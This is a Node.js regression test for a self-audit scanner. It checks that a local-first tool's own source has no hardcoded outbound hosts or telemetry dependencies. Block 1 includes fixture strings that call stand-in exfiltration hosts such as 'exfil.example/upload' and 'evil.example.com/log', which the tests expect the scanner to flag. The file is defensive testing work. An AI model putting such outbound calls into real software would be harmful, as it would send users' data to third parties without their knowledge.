#!/usr/bin/env node
'use strict';

/**
 * test-paranoid.js: regressions for src/paranoid.
 *
 * Five blocks:
 *   1. Pattern fixtures detected and classified hardcoded-host.
 *   2. Proxy-bound fixtures classified proxy-bound, not flagged.
 *   3. LLM-endpoint and signing-infra literals classified correctly.
 *   4. Telemetry SDK fixtures detected; dependency-check passes against
 *      the real package.json.
 *   5. Integration over the real src/ tree: zero critical findings.
 *      This is the regression net that protects the local-first claim.
 */

const fs   = require('fs');
const os   = require('os');
const path = require('path');

const sourceScan = require('./src/paranoid/source-scan');
const selfAudit  = require('./src/paranoid/self-audit');
const paranoid   = require('./src/paranoid');

let passed = 0, failed = 0;
function assert(label, cond, detail = '') {
  if (cond) { console.log(`  ✓ ${label}`); passed++; }
  else { console.error(`  ✗ ${label}${detail ? ' (' + detail + ')' : ''}`); failed++; }
}

console.log('\nBlock 1: hardcoded-host detection');
{
  const badCases = [
    `fetch('https://evil.example.com/log')`,
    `https.request({ host: 'sketchy.example', port: 443 })`,
    `http.request({ hostname: 'tracker.example.io', path: '/track' })`,
    `axios('https://logging.example/event')`,
    `got('https://exfil.example/upload')`,
  ];
  for (const src of badCases) {
    const hits = sourceScan.scanText('fixture.js', src);
    assert(`detects: ${src.slice(0, 50)}`,
      hits.length > 0 && hits.some(h => h.classification === 'hardcoded-host'),
      `found ${hits.length} hits, classifications: ${hits.map(h => h.classification).join(',')}`);
  }
}

console.log('\nBlock 2: proxy-bound and local-loopback');
{
  const goodCases = [
    [`https.request({ host: req.headers.host, port: 443 })`,             'proxy-bound'],
    [`http.request({ hostname: targetHost, path: req.path })`,           'proxy-bound'],
    [`fetch(\`\${process.env.ANTHROPIC_BASE_URL}/v1/messages\`)`,        'proxy-bound'],
    [`fetch('/api/clear', { method: 'POST' })`,                          'local-loopback'],
    [`fetch('/v1/api/data')`,                                            'local-loopback'],
  ];
  for (const [src, expectedClass] of goodCases) {
    const hits = sourceScan.scanText('fixture.js', src);
    const hit  = hits[0];
    assert(`classifies as ${expectedClass}: ${src.slice(0, 50)}`,
      hit && hit.classification === expectedClass,
      hit ? `got ${hit.classification}` : 'no hit');
  }
}

console.log('\nBlock 3: LLM endpoints and signing infra');
{
  const llmCases = [
    [`https.request({ hostname: 'api.anthropic.com', port: 443 })`,      'api.anthropic.com'],
    [`https.request({ hostname: 'api.openai.com' })`,                    'api.openai.com'],
    [`fetch('https://api.mistral.ai/v1/chat')`,                          'api.mistral.ai'],
  ];
  for (const [src, host] of llmCases) {
    const hits = sourceScan.scanText('fixture.js', src);
    const hit  = hits[0];
    assert(`llm-endpoint ${host}`,
      hit && hit.classification === 'llm-endpoint' && hit.host === host,
      hit ? `${hit.classification}/${hit.host}` : 'no hit');
  }
  const signing = sourceScan.scanText('fixture.js',
    `fetch('https://rekor.sigstore.dev/api/v1/log/entries')`);
  assert('signing-infra rekor.sigstore.dev',
    signing[0] && signing[0].classification === 'signing-infra');
}

console.log('\nBlock 4: telemetry SDK detection + real dependency check');
{
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'occasio-paranoid-tele-'));
  const f = path.join(tmpDir, 'bad.js');
  fs.writeFileSync(f, [
    `const Sentry = require('@sentry/node');`,
    `Sentry.init({ dsn: 'https://abc@sentry.io/123' });`,
    `mixpanel.track('event-name');`,
    `posthog.capture('login');`,
  ].join('\n'));
  const result = selfAudit.scanSource([tmpDir]);
  assert('telemetry source hits found in fixture', result.hits.length >= 3,
         `got ${result.hits.length}`);
  fs.rmSync(tmpDir, { recursive: true, force: true });

  // Real package.json must not contain any telemetry deps.
  const real = selfAudit.scanDeps(path.join(__dirname, 'package.json'));
  assert('package.json has zero telemetry dependencies',
         real.hits.length === 0,
         `unexpected: ${real.hits.map(h => h.package).join(',')}`);
}

console.log('\nBlock 5: integration over real src/ tree (the regression net)');
{
  const report = paranoid.runScanners();
  const src    = report.scanners['source-scan'];
  const tele   = report.scanners['self-audit'];

  const byClass = {};
  for (const h of src.hits) byClass[h.classification] = (byClass[h.classification] || 0) + 1;

  assert('source-scan: zero hardcoded-host hits',
         (byClass['hardcoded-host'] || 0) === 0,
         `unexpected: ${(src.hits.filter(h => h.classification === 'hardcoded-host').map(h => h.file + ':' + h.line + ' ' + h.host).join(' | '))}`);
  assert('source-scan: zero unclassified hits',
         (byClass['unclassified'] || 0) === 0,
         `unexpected: ${(src.hits.filter(h => h.classification === 'unclassified').map(h => h.file + ':' + h.line).join(' | '))}`);
  assert('self-audit: zero source telemetry hits',
         tele.hits.filter(h => h.kind !== 'dependency').length === 0);
  assert('self-audit: zero dependency telemetry hits',
         tele.deps.hits.length === 0);
  assert('overall critical count is zero',
         report.totals.critical === 0,
         `totals: ${JSON.stringify(report.totals)}`);
}

console.log(`\n  ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
process.exit(0);
